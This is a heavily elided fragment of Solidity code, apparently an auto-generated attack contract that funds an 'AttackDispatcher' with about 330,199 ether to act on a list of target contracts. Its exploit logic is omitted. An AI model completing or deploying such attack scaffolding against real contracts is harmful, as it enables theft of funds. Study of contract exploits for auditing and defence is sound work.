 ...
 * parameter. Make sure to send at least 330199 ether and 685157239463084033 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x45ec292a31992a780000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x45ec292a31992a780001; /* equals 330199 ether and 685157239463084033 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 330199685157239463084032 }(4, _targets);
    }
